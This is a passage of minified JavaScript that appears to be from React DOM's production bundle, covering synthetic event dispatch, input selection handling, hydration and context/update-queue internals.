      if (!(e.ctrlKey || e.altKey || e.metaKey) || (e.ctrlKey && e.altKey)) {
        if (e.char && 1 < e.char.length) return e.char;
        if (e.which) return String.fromCharCode(e.which);
      }
      return null;
    case "compositionend":
      return fm && "ko" !== e.locale ? null : e.data;
  }
}
var $v = {
  color: !0,
  date: !0,
  datetime: !0,
  "datetime-local": !0,
  email: !0,
  month: !0,
  number: !0,
  password: !0,
  range: !0,
  search: !0,
  tel: !0,
  text: !0,
  time: !0,
  url: !0,
  week: !0,
};
function Fp(t) {
  var e = t && t.nodeName && t.nodeName.toLowerCase();
  return "input" === e ? !!$v[t.type] : "textarea" === e;
}
function hm(t, e, n, r) {
  W0(r),
    0 < (e = Nu(e, "onChange")).length &&
      ((n = new ud("onChange", "change", null, n, r)),
      t.push({ event: n, listeners: e }));
}
var Cs = null,
  Qs = null;
function Wv(t) {
  Tm(t, 0);
}
function ua(t) {
  if (F0(io(t))) return t;
}
function Yv(t, e) {
  if ("change" === t) return e;
}
var mm = !1;
if (gr) {
  var Fa;
  if (gr) {
    var Ua = "oninput" in document;
    if (!Ua) {
      var Up = document.createElement("div");
      Up.setAttribute("oninput", "return;"),
        (Ua = "function" == typeof Up.oninput);
    }
    Fa = Ua;
  } else Fa = !1;
  mm = Fa && (!document.documentMode || 9 < document.documentMode);
}
function Bp() {
  Cs && (Cs.detachEvent("onpropertychange", gm), (Qs = Cs = null));
}
function gm(t) {
  if ("value" === t.propertyName && ua(Qs)) {
    var e = [];
    hm(e, Qs, t, nd(t)), G0(Wv, e);
  }
}
function Xv(t, e, n) {
  "focusin" === t
    ? (Bp(), (Qs = n), (Cs = e).attachEvent("onpropertychange", gm))
    : "focusout" === t && Bp();
}
function Qv(t) {
  if ("selectionchange" === t || "keyup" === t || "keydown" === t)
    return ua(Qs);
}
function Gv(t, e) {
  if ("click" === t) return ua(e);
}
function Kv(t, e) {
  if ("input" === t || "change" === t) return ua(e);
}
function qv(t, e) {
  return (t === e && (0 !== t || 1 / t == 1 / e)) || (t != t && e != e);
}
var Bn = "function" == typeof Object.is ? Object.is : qv;
function Gs(t, e) {
  if (Bn(t, e)) return !0;
  if ("object" != typeof t || null === t || "object" != typeof e || null === e)
    return !1;
  var n = Object.keys(t),
    r = Object.keys(e);
  if (n.length !== r.length) return !1;
  for (r = 0; r < n.length; r++) {
    var i = n[r];
    if (!xc.call(e, i) || !Bn(t[i], e[i])) return !1;
  }
  return !0;
}
function Vp(t) {
  for (; t && t.firstChild; ) t = t.firstChild;
  return t;
}
function Hp(t, e) {
  var r,
    n = Vp(t);
  for (t = 0; n; ) {
    if (3 === n.nodeType) {
      if (((r = t + n.textContent.length), t <= e && r >= e))
        return { node: n, offset: e - t };
      t = r;
    }
    e: {
      for (; n; ) {
        if (n.nextSibling) {
          n = n.nextSibling;
          break e;
        }
        n = n.parentNode;
      }
      n = void 0;
    }
    n = Vp(n);
  }
}
function _m(t, e) {
  return (
    !(!t || !e) &&
    (t === e ||
      ((!t || 3 !== t.nodeType) &&
        (e && 3 === e.nodeType
          ? _m(t, e.parentNode)
          : "contains" in t
          ? t.contains(e)
          : !!t.compareDocumentPosition &&
            !!(16 & t.compareDocumentPosition(e)))))
  );
}
function vm() {
  for (var t = window, e = wu(); e instanceof t.HTMLIFrameElement; ) {
    try {
      var n = "string" == typeof e.contentWindow.location.href;
    } catch {
      n = !1;
    }
    if (!n) break;
    e = wu((t = e.contentWindow).document);
  }
  return e;
}
function fd(t) {
  var e = t && t.nodeName && t.nodeName.toLowerCase();
  return (
    e &&
    (("input" === e &&
      ("text" === t.type ||
        "search" === t.type ||
        "tel" === t.type ||
        "url" === t.type ||
        "password" === t.type)) ||
      "textarea" === e ||
      "true" === t.contentEditable)
  );
}
function Zv(t) {
  var e = vm(),
    n = t.focusedElem,
    r = t.selectionRange;
  if (
    e !== n &&
    n &&
    n.ownerDocument &&
    _m(n.ownerDocument.documentElement, n)
  ) {
    if (null !== r && fd(n))
      if (
        ((e = r.start),
        void 0 === (t = r.end) && (t = e),
        "selectionStart" in n)
      )
        (n.selectionStart = e), (n.selectionEnd = Math.min(t, n.value.length));
      else if (
        (t = ((e = n.ownerDocument || document) && e.defaultView) || window)
          .getSelection
      ) {
        t = t.getSelection();
        var i = n.textContent.length,
          o = Math.min(r.start, i);
        (r = void 0 === r.end ? o : Math.min(r.end, i)),
          !t.extend && o > r && ((i = r), (r = o), (o = i)),
          (i = Hp(n, o));
        var s = Hp(n, r);
        i &&
          s &&
          (1 !== t.rangeCount ||
            t.anchorNode !== i.node ||
            t.anchorOffset !== i.offset ||
            t.focusNode !== s.node ||
            t.focusOffset !== s.offset) &&
          ((e = e.createRange()).setStart(i.node, i.offset),
          t.removeAllRanges(),
          o > r
            ? (t.addRange(e), t.extend(s.node, s.offset))
            : (e.setEnd(s.node, s.offset), t.addRange(e)));
      }
    for (e = [], t = n; (t = t.parentNode); )
      1 === t.nodeType &&
        e.push({ element: t, left: t.scrollLeft, top: t.scrollTop });
    for ("function" == typeof n.focus && n.focus(), n = 0; n < e.length; n++)
      ((t = e[n]).element.scrollLeft = t.left), (t.element.scrollTop = t.top);
  }
}
var Jv = gr && "documentMode" in document && 11 >= document.documentMode,
  no = null,
  Uc = null,
  Ts = null,
  Bc = !1;
function bp(t, e, n) {
  var r = n.window === n ? n.document : 9 === n.nodeType ? n : n.ownerDocument;
  Bc ||
    null == no ||
    no !== wu(r) ||
    ("selectionStart" in (r = no) && fd(r)
      ? (r = { start: r.selectionStart, end: r.selectionEnd })
      : (r = {
          anchorNode: (r = (
            (r.ownerDocument && r.ownerDocument.defaultView) ||
            window
          ).getSelection()).anchorNode,
          anchorOffset: r.anchorOffset,
          focusNode: r.focusNode,
          focusOffset: r.focusOffset,
        }),
    (Ts && Gs(Ts, r)) ||
      ((Ts = r),
      0 < (r = Nu(Uc, "onSelect")).length &&
        ((e = new ud("onSelect", "select", null, e, n)),
        t.push({ event: e, listeners: r }),
        (e.target = no))));
}
function Nl(t, e) {
  var n = {};
  return (
    (n[t.toLowerCase()] = e.toLowerCase()),
    (n["Webkit" + t] = "webkit" + e),
    (n["Moz" + t] = "moz" + e),
    n
  );
}
var ro = {
    animationend: Nl("Animation", "AnimationEnd"),
    animationiteration: Nl("Animation", "AnimationIteration"),
    animationstart: Nl("Animation", "AnimationStart"),
    transitionend: Nl("Transition", "TransitionEnd"),
  },
  Ba = {},
  ym = {};
function aa(t) {
  if (Ba[t]) return Ba[t];
  if (!ro[t]) return t;
  var n,
    e = ro[t];
  for (n in e) if (e.hasOwnProperty(n) && n in ym) return (Ba[t] = e[n]);
  return t;
}
gr &&
  ((ym = document.createElement("div").style),
  "AnimationEvent" in window ||
    (delete ro.animationend.animation,
    delete ro.animationiteration.animation,
    delete ro.animationstart.animation),
  "TransitionEvent" in window || delete ro.transitionend.transition);
var xm = aa("animationend"),
  wm = aa("animationiteration"),
  Sm = aa("animationstart"),
  km = aa("transitionend"),
  Cm = new Map(),
  $p =
    "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
      " "
    );
function ri(t, e) {
  Cm.set(t, e), Bi(e, [t]);
}
for (var Va = 0; Va < $p.length; Va++) {
  var Ha = $p[Va],
    ey = Ha.toLowerCase(),
    ty = Ha[0].toUpperCase() + Ha.slice(1);
  ri(ey, "on" + ty);
}
ri(xm, "onAnimationEnd"),
  ri(wm, "onAnimationIteration"),
  ri(Sm, "onAnimationStart"),
  ri("dblclick", "onDoubleClick"),
  ri("focusin", "onFocus"),
  ri("focusout", "onBlur"),
  ri(km, "onTransitionEnd"),
  Po("onMouseEnter", ["mouseout", "mouseover"]),
  Po("onMouseLeave", ["mouseout", "mouseover"]),
  Po("onPointerEnter", ["pointerout", "pointerover"]),
  Po("onPointerLeave", ["pointerout", "pointerover"]),
  Bi(
    "onChange",
    "change click focusin focusout input keydown keyup selectionchange".split(
      " "
    )
  ),
  Bi(
    "onSelect",
    "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
      " "
    )
  ),
  Bi("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
  Bi(
    "onCompositionEnd",
    "compositionend focusout keydown keypress keyup mousedown".split(" ")
  ),
  Bi(
    "onCompositionStart",
    "compositionstart focusout keydown keypress keyup mousedown".split(" ")
  ),
  Bi(
    "onCompositionUpdate",
    "compositionupdate focusout keydown keypress keyup mousedown".split(" ")
  );
var hs =
    "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
      " "
    ),
  ny = new Set("cancel close invalid load scroll toggle".split(" ").concat(hs));
function Wp(t, e, n) {
  var r = t.type || "unknown-event";
  (t.currentTarget = n), ev(r, e, void 0, t), (t.currentTarget = null);
}
function Tm(t, e) {
  e = 0 != (4 & e);
  for (var n = 0; n < t.length; n++) {
    var r = t[n],
      i = r.event;
    r = r.listeners;
    e: {
      var o = void 0;
      if (e)
        for (var s = r.length - 1; 0 <= s; s--) {
          var l = r[s],
            u = l.instance,
            a = l.currentTarget;
          if (((l = l.listener), u !== o && i.isPropagationStopped())) break e;
          Wp(i, l, a), (o = u);
        }
      else
        for (s = 0; s < r.length; s++) {
          if (
            ((u = (l = r[s]).instance),
            (a = l.currentTarget),
            (l = l.listener),
            u !== o && i.isPropagationStopped())
          )
            break e;
          Wp(i, l, a), (o = u);
        }
    }
  }
  if (ku) throw ((t = jc), (ku = !1), (jc = null), t);
}
function pe(t, e) {
  var n = e[Wc];
  void 0 === n && (n = e[Wc] = new Set());
  var r = t + "__bubble";
  n.has(r) || (Em(e, t, 2, !1), n.add(r));
}
function ba(t, e, n) {
  var r = 0;
  e && (r |= 4), Em(n, t, r, e);
}
var Ml = "_reactListening" + Math.random().toString(36).slice(2);
function Ks(t) {
  if (!t[Ml]) {
    (t[Ml] = !0),
      L0.forEach(function (n) {
        "selectionchange" !== n && (ny.has(n) || ba(n, !1, t), ba(n, !0, t));
      });
    var e = 9 === t.nodeType ? t : t.ownerDocument;
    null === e || e[Ml] || ((e[Ml] = !0), ba("selectionchange", !1, e));
  }
}
function Em(t, e, n, r) {
  switch (am(e)) {
    case 1:
      var i = gv;
      break;
    case 4:
      i = _v;
      break;
    default:
      i = sd;
  }
  (n = i.bind(null, e, n, t)),
    (i = void 0),
    !zc ||
      ("touchstart" !== e && "touchmove" !== e && "wheel" !== e) ||
      (i = !0),
    r
      ? void 0 !== i
        ? t.addEventListener(e, n, { capture: !0, passive: i })
        : t.addEventListener(e, n, !0)
      : void 0 !== i
      ? t.addEventListener(e, n, { passive: i })
      : t.addEventListener(e, n, !1);
}
function $a(t, e, n, r, i) {
  var o = r;
  if (!(1 & e || 2 & e || null === r))
    e: for (;;) {
      if (null === r) return;
      var s = r.tag;
      if (3 === s || 4 === s) {
        var l = r.stateNode.containerInfo;
        if (l === i || (8 === l.nodeType && l.parentNode === i)) break;
        if (4 === s)
          for (s = r.return; null !== s; ) {
            var u = s.tag;
            if (
              (3 === u || 4 === u) &&
              ((u = s.stateNode.containerInfo) === i ||
                (8 === u.nodeType && u.parentNode === i))
            )
              return;
            s = s.return;
          }
        for (; null !== l; ) {
          if (null === (s = _i(l))) return;
          if (5 === (u = s.tag) || 6 === u) {
            r = o = s;
            continue e;
          }
          l = l.parentNode;
        }
      }
      r = r.return;
    }
  G0(function () {
    var a = o,
      c = nd(n),
      p = [];
    e: {
      var f = Cm.get(t);
      if (void 0 !== f) {
        var d = ud,
          v = t;
        switch (t) {
          case "keypress":
            if (0 === tu(n)) break e;
          case "keydown":
          case "keyup":
            d = Dv;
            break;
          case "focusin":
            (v = "focus"), (d = Aa);
            break;
          case "focusout":
            (v = "blur"), (d = Aa);
            break;
          case "beforeblur":
          case "afterblur":
            d = Aa;
            break;
          case "click":
            if (2 === n.button) break e;
          case "auxclick":
          case "dblclick":
          case "mousedown":
          case "mousemove":
          case "mouseup":
          case "mouseout":
          case "mouseover":
          case "contextmenu":
            d = Lp;
            break;
          case "drag":
          case "dragend":
          case "dragenter":
          case "dragexit":
          case "dragleave":
          case "dragover":
          case "dragstart":
          case "drop":
            d = xv;
            break;
          case "touchcancel":
          case "touchend":
          case "touchmove":
          case "touchstart":
            d = jv;
            break;
          case xm:
          case wm:
          case Sm:
            d = kv;
            break;
          case km:
            d = Av;
            break;
          case "scroll":
            d = vv;
            break;
          case "wheel":
            d = Uv;
            break;
          case "copy":
          case "cut":
          case "paste":
            d = Tv;
            break;
          case "gotpointercapture":
          case "lostpointercapture":
          case "pointercancel":
          case "pointerdown":
          case "pointermove":
          case "pointerout":
          case "pointerover":
          case "pointerup":
            d = jp;
        }
        var g = 0 != (4 & e),
          T = !g && "scroll" === t,
          m = g ? (null !== f ? f + "Capture" : null) : f;
        g = [];
        for (var _, h = a; null !== h; ) {
          var y = (_ = h).stateNode;
          if (
            (5 === _.tag &&
              null !== y &&
              ((_ = y),
              null !== m && null != (y = $s(h, m)) && g.push(qs(h, y, _))),
            T)
          )
            break;
          h = h.return;
        }
        0 < g.length &&
          ((f = new d(f, v, null, n, c)), p.push({ event: f, listeners: g }));
      }
    }
    if (!(7 & e)) {
      if (
        ((d = "mouseout" === t || "pointerout" === t),
        (!(f = "mouseover" === t || "pointerover" === t) ||
          n === Dc ||
          !(v = n.relatedTarget || n.fromElement) ||
          (!_i(v) && !v[_r])) &&
          (d || f) &&
          ((f =
            c.window === c
              ? c
              : (f = c.ownerDocument)
              ? f.defaultView || f.parentWindow
              : window),
          d
            ? ((d = a),
              null !==
                (v = (v = n.relatedTarget || n.toElement) ? _i(v) : null) &&
                (v !== (T = Vi(v)) || (5 !== v.tag && 6 !== v.tag)) &&
                (v = null))
            : ((d = null), (v = a)),
          d !== v))
      ) {
        if (
          ((g = Lp),
          (y = "onMouseLeave"),
          (m = "onMouseEnter"),
          (h = "mouse"),
          ("pointerout" === t || "pointerover" === t) &&
            ((g = jp),
            (y = "onPointerLeave"),
            (m = "onPointerEnter"),
            (h = "pointer")),
          (T = null == d ? f : io(d)),
          (_ = null == v ? f : io(v)),
          ((f = new g(y, h + "leave", d, n, c)).target = T),
          (f.relatedTarget = _),
          (y = null),
          _i(c) === a &&
            (((g = new g(m, h + "enter", v, n, c)).target = _),
            (g.relatedTarget = T),
            (y = g)),
          (T = y),
          d && v)
        )
          t: {
            for (m = v, h = 0, _ = g = d; _; _ = Xi(_)) h++;
            for (_ = 0, y = m; y; y = Xi(y)) _++;
            for (; 0 < h - _; ) (g = Xi(g)), h--;
            for (; 0 < _ - h; ) (m = Xi(m)), _--;
            for (; h--; ) {
              if (g === m || (null !== m && g === m.alternate)) break t;
              (g = Xi(g)), (m = Xi(m));
            }
            g = null;
          }
        else g = null;
        null !== d && Yp(p, f, d, g, !1),
          null !== v && null !== T && Yp(p, T, v, g, !0);
      }
      if (
        "select" ===
          (d = (f = a ? io(a) : window).nodeName && f.nodeName.toLowerCase()) ||
        ("input" === d && "file" === f.type)
      )
        var C = Yv;
      else if (Fp(f))
        if (mm) C = Kv;
        else {
          C = Qv;
          var k = Xv;
        }
      else
        (d = f.nodeName) &&
          "input" === d.toLowerCase() &&
          ("checkbox" === f.type || "radio" === f.type) &&
          (C = Gv);
      switch (
        (C && (C = C(t, a))
          ? hm(p, C, n, c)
          : (k && k(t, f, a),
            "focusout" === t &&
              (k = f._wrapperState) &&
              k.controlled &&
              "number" === f.type &&
              Pc(f, "number", f.value)),
        (k = a ? io(a) : window),
        t)
      ) {
        case "focusin":
          (Fp(k) || "true" === k.contentEditable) &&
            ((no = k), (Uc = a), (Ts = null));
          break;
        case "focusout":
          Ts = Uc = no = null;
          break;
        case "mousedown":
          Bc = !0;
          break;
        case "contextmenu":
        case "mouseup":
        case "dragend":
          (Bc = !1), bp(p, n, c);
          break;
        case "selectionchange":
          if (Jv) break;
        case "keydown":
        case "keyup":
          bp(p, n, c);
      }
      var S;
      if (cd)
        e: {
          switch (t) {
            case "compositionstart":
              var E = "onCompositionStart";
              break e;
            case "compositionend":
              E = "onCompositionEnd";
              break e;
            case "compositionupdate":
              E = "onCompositionUpdate";
              break e;
          }
          E = void 0;
        }
      else
        to
          ? dm(t, n) && (E = "onCompositionEnd")
          : "keydown" === t && 229 === n.keyCode && (E = "onCompositionStart");
      E &&
        (fm &&
          "ko" !== n.locale &&
          (to || "onCompositionStart" !== E
            ? "onCompositionEnd" === E && to && (S = cm())
            : ((ld = "value" in (Lr = c) ? Lr.value : Lr.textContent),
              (to = !0))),
        0 < (k = Nu(a, E)).length &&
          ((E = new zp(E, t, null, n, c)),
          p.push({ event: E, listeners: k }),
          S ? (E.data = S) : null !== (S = pm(n)) && (E.data = S))),
        (S = Vv ? Hv(t, n) : bv(t, n)) &&
          0 < (a = Nu(a, "onBeforeInput")).length &&
          ((c = new zp("onBeforeInput", "beforeinput", null, n, c)),
          p.push({ event: c, listeners: a }),
          (c.data = S));
    }
    Tm(p, e);
  });
}
function qs(t, e, n) {
  return { instance: t, listener: e, currentTarget: n };
}
function Nu(t, e) {
  for (var n = e + "Capture", r = []; null !== t; ) {
    var i = t,
      o = i.stateNode;
    5 === i.tag &&
      null !== o &&
      ((i = o),
      null != (o = $s(t, n)) && r.unshift(qs(t, o, i)),
      null != (o = $s(t, e)) && r.push(qs(t, o, i))),
      (t = t.return);
  }
  return r;
}
function Xi(t) {
  if (null === t) return null;
  do {
    t = t.return;
  } while (t && 5 !== t.tag);
  return t || null;
}
function Yp(t, e, n, r, i) {
  for (var o = e._reactName, s = []; null !== n && n !== r; ) {
    var l = n,
      u = l.alternate,
      a = l.stateNode;
    if (null !== u && u === r) break;
    5 === l.tag &&
      null !== a &&
      ((l = a),
      i
        ? null != (u = $s(n, o)) && s.unshift(qs(n, u, l))
        : i || (null != (u = $s(n, o)) && s.push(qs(n, u, l)))),
      (n = n.return);
  }
  0 !== s.length && t.push({ event: e, listeners: s });
}
var ry = /\r\n?/g,
  iy = /\u0000|\uFFFD/g;
function Xp(t) {
  return ("string" == typeof t ? t : "" + t).replace(ry, "\n").replace(iy, "");
}
function Ol(t, e, n) {
  if (((e = Xp(e)), Xp(t) !== e && n)) throw Error(R(425));
}
function Mu() {}
var Vc = null,
  Hc = null;
function bc(t, e) {
  return (
    "textarea" === t ||
    "noscript" === t ||
    "string" == typeof e.children ||
    "number" == typeof e.children ||
    ("object" == typeof e.dangerouslySetInnerHTML &&
      null !== e.dangerouslySetInnerHTML &&
      null != e.dangerouslySetInnerHTML.__html)
  );
}
var $c = "function" == typeof setTimeout ? setTimeout : void 0,
  oy = "function" == typeof clearTimeout ? clearTimeout : void 0,
  Qp = "function" == typeof Promise ? Promise : void 0,
  sy =
    "function" == typeof queueMicrotask
      ? queueMicrotask
      : typeof Qp < "u"
      ? function (t) {
          return Qp.resolve(null).then(t).catch(ly);
        }
      : $c;
function ly(t) {
  setTimeout(function () {
    throw t;
  });
}
function Wa(t, e) {
  var n = e,
    r = 0;
  do {
    var i = n.nextSibling;
    if ((t.removeChild(n), i && 8 === i.nodeType))
      if ("/$" === (n = i.data)) {
        if (0 === r) return t.removeChild(i), void Xs(e);
        r--;
      } else ("$" !== n && "$?" !== n && "$!" !== n) || r++;
    n = i;
  } while (n);
  Xs(e);
}
function $r(t) {
  for (; null != t; t = t.nextSibling) {
    var e = t.nodeType;
    if (1 === e || 3 === e) break;
    if (8 === e) {
      if ("$" === (e = t.data) || "$!" === e || "$?" === e) break;
      if ("/$" === e) return null;
    }
  }
  return t;
}
function Gp(t) {
  t = t.previousSibling;
  for (var e = 0; t; ) {
    if (8 === t.nodeType) {
      var n = t.data;
      if ("$" === n || "$!" === n || "$?" === n) {
        if (0 === e) return t;
        e--;
      } else "/$" === n && e++;
    }
    t = t.previousSibling;
  }
  return null;
}
var $o = Math.random().toString(36).slice(2),
  Qn = "__reactFiber$" + $o,
  Zs = "__reactProps$" + $o,
  _r = "__reactContainer$" + $o,
  Wc = "__reactEvents$" + $o,
  uy = "__reactListeners$" + $o,
  ay = "__reactHandles$" + $o;
function _i(t) {
  var e = t[Qn];
  if (e) return e;
  for (var n = t.parentNode; n; ) {
    if ((e = n[_r] || n[Qn])) {
      if (
        ((n = e.alternate),
        null !== e.child || (null !== n && null !== n.child))
      )
        for (t = Gp(t); null !== t; ) {
          if ((n = t[Qn])) return n;
          t = Gp(t);
        }
      return e;
    }
    n = (t = n).parentNode;
  }
  return null;
}
function _l(t) {
  return !(t = t[Qn] || t[_r]) ||
    (5 !== t.tag && 6 !== t.tag && 13 !== t.tag && 3 !== t.tag)
    ? null
    : t;
}
function io(t) {
  if (5 === t.tag || 6 === t.tag) return t.stateNode;
  throw Error(R(33));
}
function ca(t) {
  return t[Zs] || null;
}
var Yc = [],
  oo = -1;
function ii(t) {
  return { current: t };
}
function he(t) {
  0 > oo || ((t.current = Yc[oo]), (Yc[oo] = null), oo--);
}
function de(t, e) {
  oo++, (Yc[oo] = t.current), (t.current = e);
}
var Jr = {},
  gt = ii(Jr),
  At = ii(!1),
  Oi = Jr;
function No(t, e) {
  var n = t.type.contextTypes;
  if (!n) return Jr;
  var r = t.stateNode;
  if (r && r.__reactInternalMemoizedUnmaskedChildContext === e)
    return r.__reactInternalMemoizedMaskedChildContext;
  var o,
    i = {};
  for (o in n) i[o] = e[o];
  return (
    r &&
      (((t = t.stateNode).__reactInternalMemoizedUnmaskedChildContext = e),
      (t.__reactInternalMemoizedMaskedChildContext = i)),
    i
  );
}
function Ft(t) {
  return null != (t = t.childContextTypes);
}
function Ou() {
  he(At), he(gt);
}
function Kp(t, e, n) {
  if (gt.current !== Jr) throw Error(R(168));
  de(gt, e), de(At, n);
}
function Pm(t, e, n) {
  var r = t.stateNode;
  if (((e = e.childContextTypes), "function" != typeof r.getChildContext))
    return n;
  for (var i in (r = r.getChildContext()))
    if (!(i in e)) throw Error(R(108, X_(t) || "Unknown", i));
  return Ce({}, n, r);
}
function Ru(t) {
  return (
    (t =
      ((t = t.stateNode) && t.__reactInternalMemoizedMergedChildContext) || Jr),
    (Oi = gt.current),
    de(gt, t),
    de(At, At.current),
    !0
  );
}
function qp(t, e, n) {
  var r = t.stateNode;
  if (!r) throw Error(R(169));
  n
    ? ((t = Pm(t, e, Oi)),
      (r.__reactInternalMemoizedMergedChildContext = t),
      he(At),
      he(gt),
      de(gt, t))
    : he(At),
    de(At, n);
}
var lr = null,
  fa = !1,
  Ya = !1;
function Nm(t) {
  null === lr ? (lr = [t]) : lr.push(t);
}
function cy(t) {
  (fa = !0), Nm(t);
}
function oi() {
  if (!Ya && null !== lr) {
    Ya = !0;
    var t = 0,
      e = ae;
    try {
      var n = lr;
      for (ae = 1; t < n.length; t++) {
        var r = n[t];
        do {
          r = r(!0);
        } while (null !== r);
      }
      (lr = null), (fa = !1);
    } catch (i) {
      throw (null !== lr && (lr = lr.slice(t + 1)), J0(rd, oi), i);
    } finally {
      (ae = e), (Ya = !1);
    }
  }
  return null;
}
var so = [],
  lo = 0,
  Du = null,
  Lu = 0,
  hn = [],
  mn = 0,
  Ri = null,
  cr = 1,
  fr = "";
function pi(t, e) {
  (so[lo++] = Lu), (so[lo++] = Du), (Du = t), (Lu = e);
}
function Mm(t, e, n) {
  (hn[mn++] = cr), (hn[mn++] = fr), (hn[mn++] = Ri), (Ri = t);
  var r = cr;
  t = fr;
  var i = 32 - An(r) - 1;
  (r &= ~(1 << i)), (n += 1);
  var o = 32 - An(e) + i;
  if (30 < o) {
    var s = i - (i % 5);
    (o = (r & ((1 << s) - 1)).toString(32)),
      (r >>= s),
      (i -= s),
      (cr = (1 << (32 - An(e) + i)) | (n << i) | r),
      (fr = o + t);
  } else (cr = (1 << o) | (n << i) | r), (fr = t);
}
function dd(t) {
  null !== t.return && (pi(t, 1), Mm(t, 1, 0));
}
function pd(t) {
  for (; t === Du; )
    (Du = so[--lo]), (so[lo] = null), (Lu = so[--lo]), (so[lo] = null);
  for (; t === Ri; )
    (Ri = hn[--mn]),
      (hn[mn] = null),
      (fr = hn[--mn]),
      (hn[mn] = null),
      (cr = hn[--mn]),
      (hn[mn] = null);
}
var rn = null,
  nn = null,
  _e = !1,
  zn = null;
function Om(t, e) {
  var n = _n(5, null, null, 0);
  (n.elementType = "DELETED"),
    (n.stateNode = e),
    (n.return = t),
    null === (e = t.deletions)
      ? ((t.deletions = [n]), (t.flags |= 16))
      : e.push(n);
}
function Zp(t, e) {
  switch (t.tag) {
    case 5:
      var n = t.type;
      return (
        null !==
          (e =
            1 !== e.nodeType || n.toLowerCase() !== e.nodeName.toLowerCase()
              ? null
              : e) && ((t.stateNode = e), (rn = t), (nn = $r(e.firstChild)), !0)
      );
    case 6:
      return (
        null !== (e = "" === t.pendingProps || 3 !== e.nodeType ? null : e) &&
        ((t.stateNode = e), (rn = t), (nn = null), !0)
      );
    case 13:
      return (
        null !== (e = 8 !== e.nodeType ? null : e) &&
        ((n = null !== Ri ? { id: cr, overflow: fr } : null),
        (t.memoizedState = {
          dehydrated: e,
          treeContext: n,
          retryLane: 1073741824,
        }),
        ((n = _n(18, null, null, 0)).stateNode = e),
        (n.return = t),
        (t.child = n),
        (rn = t),
        (nn = null),
        !0)
      );
    default:
      return !1;
  }
}
function Xc(t) {
  return 0 != (1 & t.mode) && 0 == (128 & t.flags);
}
function Qc(t) {
  if (_e) {
    var e = nn;
    if (e) {
      var n = e;
      if (!Zp(t, e)) {
        if (Xc(t)) throw Error(R(418));
        e = $r(n.nextSibling);
        var r = rn;
        e && Zp(t, e)
          ? Om(r, n)
          : ((t.flags = (-4097 & t.flags) | 2), (_e = !1), (rn = t));
      }
    } else {
      if (Xc(t)) throw Error(R(418));
      (t.flags = (-4097 & t.flags) | 2), (_e = !1), (rn = t);
    }
  }
}
function Jp(t) {
  for (t = t.return; null !== t && 5 !== t.tag && 3 !== t.tag && 13 !== t.tag; )
    t = t.return;
  rn = t;
}
function Rl(t) {
  if (t !== rn) return !1;
  if (!_e) return Jp(t), (_e = !0), !1;
  var e;
  if (
    ((e = 3 !== t.tag) &&
      !(e = 5 !== t.tag) &&
      (e =
        "head" !== (e = t.type) &&
        "body" !== e &&
        !bc(t.type, t.memoizedProps)),
    e && (e = nn))
  ) {
    if (Xc(t)) throw (Rm(), Error(R(418)));
    for (; e; ) Om(t, e), (e = $r(e.nextSibling));
  }
  if ((Jp(t), 13 === t.tag)) {
    if (!(t = null !== (t = t.memoizedState) ? t.dehydrated : null))
      throw Error(R(317));
    e: {
      for (t = t.nextSibling, e = 0; t; ) {
        if (8 === t.nodeType) {
          var n = t.data;
          if ("/$" === n) {
            if (0 === e) {
              nn = $r(t.nextSibling);
              break e;
            }
            e--;
          } else ("$" !== n && "$!" !== n && "$?" !== n) || e++;
        }
        t = t.nextSibling;
      }
      nn = null;
    }
  } else nn = rn ? $r(t.stateNode.nextSibling) : null;
  return !0;
}
function Rm() {
  for (var t = nn; t; ) t = $r(t.nextSibling);
}
function Mo() {
  (nn = rn = null), (_e = !1);
}
function hd(t) {
  null === zn ? (zn = [t]) : zn.push(t);
}
var fy = Sr.ReactCurrentBatchConfig;
function Rn(t, e) {
  if (t && t.defaultProps) {
    for (var n in ((e = Ce({}, e)), (t = t.defaultProps)))
      void 0 === e[n] && (e[n] = t[n]);
    return e;
  }
  return e;
}
var zu = ii(null),
  ju = null,
  uo = null,
  md = null;
function gd() {
  md = uo = ju = null;
}
function _d(t) {
  var e = zu.current;
  he(zu), (t._currentValue = e);
}
function Gc(t, e, n) {
  for (; null !== t; ) {
    var r = t.alternate;
    if (
      ((t.childLanes & e) !== e
        ? ((t.childLanes |= e), null !== r && (r.childLanes |= e))
        : null !== r && (r.childLanes & e) !== e && (r.childLanes |= e),
      t === n)
    )
      break;
    t = t.return;
  }
}
function xo(t, e) {
  (ju = t),
    (md = uo = null),
    null !== (t = t.dependencies) &&
      null !== t.firstContext &&
      (t.lanes & e && (It = !0), (t.firstContext = null));
}
function kn(t) {
  var e = t._currentValue;
  if (md !== t)
    if (((t = { context: t, memoizedValue: e, next: null }), null === uo)) {
      if (null === ju) throw Error(R(308));
      (uo = t), (ju.dependencies = { lanes: 0, firstContext: t });
    } else uo = uo.next = t;
  return e;
}
var vi = null;
function vd(t) {
  null === vi ? (vi = [t]) : vi.push(t);
}
function Dm(t, e, n, r) {
  var i = e.interleaved;
  return (
    null === i ? ((n.next = n), vd(e)) : ((n.next = i.next), (i.next = n)),
    (e.interleaved = n),
    vr(t, r)
  );
}
function vr(t, e) {
  t.lanes |= e;
  var n = t.alternate;
  for (null !== n && (n.lanes |= e), n = t, t = t.return; null !== t; )
    (t.childLanes |= e),
      null !== (n = t.alternate) && (n.childLanes |= e),
      (n = t),
      (t = t.return);
  return 3 === n.tag ? n.stateNode : null;
}
var Or = !1;
function yd(t) {
  t.updateQueue = {
    baseState: t.memoizedState,
    firstBaseUpdate: null,
    lastBaseUpdate: null,
    shared: { pending: null, interleaved: null, lanes: 0 },
    effects: null,
  };
}
function Lm(t, e) {
  (t = t.updateQueue),
    e.updateQueue === t &&
      (e.updateQueue = {
        baseState: t.baseState,
        firstBaseUpdate: t.firstBaseUpdate,
        lastBaseUpdate: t.lastBaseUpdate,
        shared: t.shared,
        effects: t.effects,
      });
}
function pr(t, e) {
  return {
    eventTime: t,
